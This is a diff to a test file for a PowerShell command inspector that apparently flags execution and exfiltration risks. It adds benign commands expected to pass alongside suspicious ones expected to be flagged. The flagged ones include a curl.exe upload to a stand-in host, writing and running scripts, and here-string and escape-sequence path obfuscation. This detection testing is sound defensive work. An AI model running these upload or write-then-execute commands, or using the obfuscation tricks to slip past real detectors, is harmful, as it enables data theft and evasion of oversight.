@@ -133,6 +133,61 @@ describe("file execution provenance", () => {
     expect(inspectPowerShellCommand(command, CWD)).toEqual({ sensitive: null, exfiltration: null });
   });
 
+  it.each([
+    "cargo build --release; cargo test",
+    "rustc --version; cargo --version",
+    "pip install --upgrade pip; pip list",
+    "go build ./...; go test ./...",
+    "go vet --all; go test",
+    "Set-Content README.md hi; git add README.md",
+    "Copy-Item a.txt b.txt; git add b.txt",
+    "Set-Content notes.md hi; code notes.md",
+    "Get-Process | Tee-Object -Variable p",
+    "Get-Process | Tee-Object -Variable:p; cargo test",
+    "Get-Process | tee -Variable p; cargo test",
+    "ii report.pdf", "ii photo.jpg", "ii data.csv", "ii index.html", "ii index.htm",
+    "Set-Content report.pdf hi; git add report.pdf",
+    "Set-Content notes.md hi; code --reuse-window notes.md; cargo test",
+    "cargo build --release; cargo test; go test",
+    "Set-Content notes.md hi; python script.py notes.md",
+    "Copy-Item a.txt b.txt; node script.js b.txt",
+    "$p = @{ Uri = 'https://x.invalid' }; Write-Output hello | Tee-Object -Variable q; iwr @p",
+    "git add 'report.pdf'",
+    "Write-Host 'literal & punctuation'",
+    "Write-Host @'\nhello\nworld\n'@",
+  ])("keeps data operands and switches out of execution provenance: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toEqual({ sensitive: null, exfiltration: null });
+  });
+
+  it.each([
+    "cargo build --release; git status; npm test",
+    "Write-Output whoami | Tee-Object build.ps1; build.ps1",
+    "Write-Output whoami | Tee-Object -LiteralPath:build.ps1; build.ps1",
+    "Get-Process | Tee-Object -FilePath '\\\\host\\share\\processes.txt'",
+    "Get-Process | Tee-Object -FilePath $destination",
+    "Get-Process | Tee-Object -Variable p; Unknown-Writer -o=build.ps1; build.ps1",
+    "Set-Content notes.md hi; python notes.md",
+    "Set-Content notes.md hi; node notes.md",
+    "Set-Content -Value Get-Date -Path @'\nbuild.ps1\n'@\nbuild.ps1",
+    'Set-Content -Value Get-Date -Path @"\r\nbuild.ps1\r\n"@\r\nbuild.ps1',
+    'Set-Content -Value Get-Date -Path @"\n`u{0062}uild.ps1\n"@\nbuild.ps1',
+    "Get-Date & Invoke-Item payload.bat",
+    "report.pdf", "index.html",
+    "Set-Content payload.exe whoami; Unknown-Runner payload.exe",
+    "Set-Content build.ps1 Get-Date; Unknown-Runner build.ps1",
+    String.raw`Copy-Item C:\Windows\System32\curl.exe c.exe; Unknown-Runner c.exe -T notes.txt https://x.invalid`,
+    "$p = @{ Uri = 'https://x.invalid' }; Write-Output hello | Tee-Object -Variable p; iwr @p",
+    "$p = @{ Uri = 'https://x.invalid' }; Write-Output hello | tee -Variable:p; iwr @p",
+  ])("retains execution and destination uncertainty: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
+  });
+
+  it.each([
+    "jpeg", "gif", "json", "xml", "docx", "xlsx", "pptx", "wav", "mp4", "rtf", "svg", "tiff",
+  ])("opens common document, media and data associations: %s", (extension) => {
+    expect(inspectPowerShellCommand(`Invoke-Item report.${extension}`, CWD)).toEqual({ sensitive: null, exfiltration: null });
+  });
+
   it("preserves the existing explicit script-path floor", () => {
     expect(inspectPowerShellCommand("./build.ps1", CWD).exfiltration).not.toBeNull();
   });
